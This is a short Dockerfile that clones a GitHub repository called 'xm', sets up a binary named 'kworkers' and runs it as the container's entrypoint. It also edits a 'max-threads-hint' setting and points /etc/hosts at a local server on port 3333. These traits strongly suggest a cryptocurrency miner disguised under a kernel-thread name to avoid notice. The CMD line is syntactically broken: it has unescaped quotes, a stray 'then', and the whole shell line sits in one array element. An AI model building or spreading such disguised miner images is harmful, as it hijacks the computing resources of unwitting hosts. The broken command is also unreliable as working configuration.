FROM alpine:latest
ENV HINT 100
ENV SERVER_IP 127.0.0.1
ENV SERVER_URL localhost:3333
RUN set -ex \
    && apk add git \
    && cd /tmp \
    && git clone https://github.com/caeken/xm \
    && rm /tmp/xm/Dockerfile \
    && cd /tmp/xm \
    && chmod 777 kworkers 

CMD ["sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": $HINT,/' config.json && ping -c 3 $SERVER_IP &> /dev/null && [ $? -eq 0 ] then echo $SERVER_IP $SERVER_URL >> /etc/hosts"]

WORKDIR /tmp/xm

ENTRYPOINT ["./kworkers"]
